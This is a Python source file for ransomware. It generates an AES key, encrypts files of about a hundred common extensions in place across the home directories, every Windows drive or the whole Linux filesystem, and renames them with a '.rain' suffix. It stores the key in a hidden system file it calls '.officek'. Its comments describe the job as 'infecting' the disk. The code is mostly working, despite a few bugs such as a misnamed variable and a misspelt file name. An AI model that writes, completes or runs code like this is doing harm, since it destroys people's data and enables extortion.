import os,platform,glob,sys,string
from os import system as sis
from Crypto.Cipher import AES
from Crypto import Random

BLOCK_SIZE = 32
s = platform.system()
k = Random.new().read(BLOCK_SIZE)
aes = AES.new(k,AES.MODE_ECB)
drives = list(string.ascii_uppercase)

ext=['*.txt','*.lnk','*.application','*.veg','*.doc','*.pdf','*.jpg','*.gif','*.png','*.bitmap'
,'*.mp4','*.avi','*.zip','*.wav','*.svg','*.mdb','*.rar','*.tar','*.xf','*.gz'
,'*.sqlite3','*.mov','*.pptx','*.pptm','*.xlsx','*.xlsm','*.aes','*.accdb','*.bmp'
,'*.mpeg','*.sql','*.sqlitedb','*.jar','*.java','*.cdr','*.vssettings','*.vbs','*.vssx'
,'*.cpp','*.c','*.NET','*.rb','*.sh','*.appref-ms','*.html','*.css','*.sublime-package'
,'*.bz2','*.iso','*.img','*.sfk','*.mkv','*.psd','*.xz','*.7z','*.gz','*.mid','*.wmv','*.mov'
,'*.cdr','*.ai','*.tif','*.fla','*.swf','*.dwg','*.mpg','*.xls','*.docx','*.rtf','*.pps','*.ppt'
,'*.pptx','*.ppsx','*.ico','*.3gp','*.dxf','*.eps','*.max','*.nrg','*.ogg','*.pic','*.php','*.qxd'
,'*.rm','*.swf','*.vob','*.wri','*.vbs','*.chc','*.real','*.list','*.desktop','*.so','*.json','*.new'
,'*.bkp','*.bak','*.tmp','*.gho','*.mp3','*.pyd','*.pyc','*.xvf','*.xvfz']

class Crypt:
	"""
	Class containing the methods used for encryption
	"""
	def crypt(file):
		#Encrypt a file
		try:
			with open(file,'rb') as f:
				f = f.read()
				correct = f+b'#'*(16-len(f)%16)
				cifdata = aes.encrypt(correct)
			with open(file,'wb') as cifile:
				cifile.write((os.path.splitext(file)[1].strip('.')+'.').encode()+cifdata)
			ne = os.path.splitext(file)[0]
			os.rename(file,ne+".rain")
		except:
			pass


	def c_iterator(dirct):
		#An iterator that uses glob to search for files with pre-defined extensions and encrypt them
		for i in ext:
			iterator = glob.iglob(dirct+'/**/'+i,recursive=True)
			for file in iterator:
					Crypt.crypt(file)

	def infectall():
		"""
		Once you have encrypted the three main directories using "c_iterator" this function is used, 
		which encrypts the rest of the entire disk and ,in Windows, 
		searches for the drives inserted in the machine and continues the process
		"""
		if s=='Windows':
			for drive in drives:
				drive = drive+':/'
				for e in ext:
					iterator = glob.iglob(drive+'/**/'+e,recursive=True)
					for file in iterator:
						Crypt.crypt(file)
		elif s=='Linux':
			for e in ext:
				iterator = glob.iglob('//**/'+e,recursive=True)
				for file in iterator:
					Crypt.crypt(file)

	def resource_path(relative_path):
		#Here is just a fix so there are no compile errors with certain libraries
		if hasattr(sys, '_MEIPASS'):
			return os.path.join(sys._MEIPASS, relative_path)
		return os.path.join(os.path.abspath("."), relative_path)

	def check_w_key(documents,documentos=os.path.expanduser('~/Documentos')):
		"""
		This method in particular ensures the functionality of subsequent decryption.
		Basically it checks if a key has already been generated for that computer by reading the saved key files.
		This helps to ensure that a new key is not created when the machine is restarted and the new one is lost.
		Maybe it would be much better just to save in a text file a "0" state for key saved or know what to do all that code.
		Forgive me. I need help.
		"""
		global k
		if s=='Windows':
			try:
				try:
					with open(documents+'/.officek','rb') as okey:
						ok = okey.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open(documents+'/.officek','wb') as key:
								key.write(k)
							sis('cd '+documents)
							sis('attrib +s +h '+documents+'/.officek')
						except:
							pass
				except:
					try:
						with open(documents+'/.officek','wb') as key:
							key.write(k)
						sis('cd '+documents)
						sis('attrib +s +h '+documents+'/.officek')
					except:
						pass
			except:
				try:
					with open('C:/Users/Public/.officek','rb') as okey:
						ok = okey.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open('C:/Users/Public/.officek','wb') as key:
								key.write(k)
							sis('cd C:/Users/Public')
							sis('attrib +s +h C:/Users/Public/.officek')
						except:
							pass
				except:
					try:
						with open('C:/Users/Public/.officek','wb') as key:
							key.write(k)
						sis('cd C:/Users/Public')
						sis('attrib +s +h C:/Users/Public/.officek')
					except:
						pass
		elif s=='Linux':
			try:
				try:
					with open(documents+'/.officek','rb') as okey:
						ok = okey.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open(documents+'/.officek','wb') as key:
								key.write(k)
						except:
							pass
				except:
					try:
						with open(documents+'/.officek','wb') as key:
							key.write(k)
					except:
						pass
			except:
				try:
					with open(documentos+'/.officek','rb') as okey:
						ok = key.read()
					if len(ok)==32:
						k = ok
					else:
						try:
							with open(documentos+'/.oficcek','wb') as key:
								key.write(k)
						except:
							pass
				except:
					try:
						with open(documentos+'/.oficcek','wb') as key:
							key.write(k)
					except:
						pass
